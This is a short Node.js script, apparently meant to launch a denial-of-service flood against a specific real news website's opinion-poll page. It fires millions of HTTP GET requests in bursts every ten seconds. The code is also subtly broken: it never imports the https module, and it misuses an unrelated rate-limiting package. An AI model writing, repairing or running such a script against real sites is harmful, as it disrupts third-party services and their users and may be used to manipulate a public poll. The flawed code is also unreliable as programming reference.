const Ddos = require('ddos');

// URL of the website to visit
const url = 'https://www.kalbela.com/opinion-poll/-/103';

// Set up the DDoS options
const options = {
    burst: 2000000,  // Number of requests to send at once
    limit: 60   // Limit of requests in the given timeframe
};

const ddos = new Ddos(options);

// Function to simulate DDoS attack
function attack() {
    for (let i = 0; i < options.burst; i++) {
        // Create a simple HTTP GET request
        const req = https.get(url, (res) => {
            console.log(`Status Code: ${res.statusCode}`);
            res.on('data', (chunk) => {
                // Optional: handle data chunks here
            });
            res.on('end', () => {
                console.log('Request completed');
            });
        });

        req.on('error', (e) => {
            console.error(`Problem with request: ${e.message}`);
        });
    }
}

// Set an interval to attack the website every 10 seconds
setInterval(attack, 10000);

// Initial call to start the process immediately
attack();
